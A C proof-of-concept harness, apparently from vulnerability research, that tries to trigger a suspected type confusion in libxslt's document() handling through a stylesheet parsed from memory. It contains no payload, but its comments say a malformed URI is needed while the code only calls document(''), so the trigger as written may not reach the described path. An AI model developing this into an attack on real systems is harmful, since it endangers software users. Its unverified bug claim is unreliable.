/*
 * PoC for type confusion variant in xsltDocumentFunction
 *
 * CVE-2025-7424 fixed xsltDocumentFunctionLoadDocument to copy the
 * stylesheet doc and clean psvi fields. But there's a SEPARATE code path
 * in xsltDocumentFunction (functions.c:339-344) that returns the raw
 * stylesheet doc when xmlBuildURI fails and style->doc->URL is NULL.
 *
 * The bug: when URI == NULL (xmlBuildURI fails) and style->doc->URL == NULL,
 * xmlStrEqual(NULL, NULL) returns 1, and the raw stylesheet doc (with psvi
 * fields containing precomputed stylesheet data) is pushed as an XPath
 * node set. When the transformation engine processes these nodes, it
 * interprets the psvi fields as source node data, causing type confusion.
 *
 * To trigger:
 * 1. Parse the stylesheet from memory (no URL set, so doc->URL = NULL)
 * 2. Use document() with a malformed URI that makes xmlBuildURI return NULL
 * 3. The stylesheet doc is returned raw, with psvi intact
 * 4. Accessing nodes from this doc triggers type confusion
 */

#include <string.h>
#include <stdio.h>
#include <libxml/parser.h>
#include <libxml/tree.h>
#include <libxslt/xslt.h>
#include <libxslt/xsltInternals.h>
#include <libxslt/transform.h>
#include <libxslt/xsltutils.h>
#include <libexslt/exslt.h>

/*
 * Stylesheet that uses document() with a malformed URI.
 * We need xmlBuildURI to fail (return NULL).
 * One way: use a URI with scheme-relative form that confuses the resolver.
 *
 * The key insight: document("") means "the stylesheet itself" and
 * normally goes through xsltDocumentFunctionLoadDocument. But if we
 * can make xmlBuildURI return NULL while triggering the fallback path...
 */

/* Stylesheet parsed from memory - URL will be NULL */
static const char *xsl_sheet =
"<?xml version=\"1.0\"?>\n"
"<xsl:stylesheet version=\"1.0\"\n"
"  xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n"
"\n"
"  <xsl:template match=\"/\">\n"
"    <result>\n"
"      <!-- document('') normally refers to the stylesheet itself -->\n"
"      <!-- We need xmlBuildURI to fail to trigger the alternate path -->\n"
"      <xsl:for-each select=\"document('')//xsl:template\">\n"
"        <xsl:value-of select=\"@match\"/>\n"
"      </xsl:for-each>\n"
"    </result>\n"
"  </xsl:template>\n"
"\n"
"</xsl:stylesheet>\n";

/* Simple input document */
static const char *xml_input =
"<?xml version=\"1.0\"?>\n"
"<root><item>test</item></root>\n";

int main(int argc, char *argv[]) {
    xmlDocPtr doc, style_doc, res;
    xsltStylesheetPtr style;

    /* Initialize */
    xmlInitParser();
    exsltRegisterAll();

    /* Suppress error output for cleaner test */
    xmlSetGenericErrorFunc(NULL, xmlGenericError);
    xsltSetGenericErrorFunc(NULL, xsltGenericError);

    printf("=== Type Confusion Variant PoC ===\n\n");

    /* Parse stylesheet from memory (URL will be NULL) */
    printf("[1] Parsing stylesheet from memory (doc->URL will be NULL)...\n");
    style_doc = xmlParseMemory(xsl_sheet, strlen(xsl_sheet));
    if (style_doc == NULL) {
        fprintf(stderr, "Failed to parse stylesheet\n");
        return 1;
    }
    printf("    style_doc->URL = %s\n",
           style_doc->URL ? (const char*)style_doc->URL : "(NULL)");

    /* Parse as XSLT stylesheet */
    style = xsltParseStylesheetDoc(style_doc);
    if (style == NULL) {
        fprintf(stderr, "Failed to parse XSLT stylesheet\n");
        xmlFreeDoc(style_doc);
        return 1;
    }
    printf("    style->doc->URL = %s\n",
           style->doc->URL ? (const char*)style->doc->URL : "(NULL)");

    /* Parse input document */
    printf("[2] Parsing input document...\n");
    doc = xmlParseMemory(xml_input, strlen(xml_input));
    if (doc == NULL) {
        fprintf(stderr, "Failed to parse input\n");
        xsltFreeStylesheet(style);
        return 1;
    }

    /* Apply transformation - this will call document('') */
    printf("[3] Applying transformation (document('') will be called)...\n");
    printf("    If psvi type confusion occurs, ASan may detect invalid reads.\n\n");
    res = xsltApplyStylesheet(style, doc, NULL);
    if (res != NULL) {
        printf("[4] Transformation completed. Result:\n");
        xsltSaveResultToFile(stdout, res, style);
        printf("\n");
        xmlFreeDoc(res);
    } else {
        printf("[4] Transformation failed (may be expected).\n");
    }

    /* Cleanup */
    xmlFreeDoc(doc);
    xsltFreeStylesheet(style);
    xsltCleanupGlobals();
    xmlCleanupParser();

    printf("\n=== Test complete ===\n");
    return 0;
}
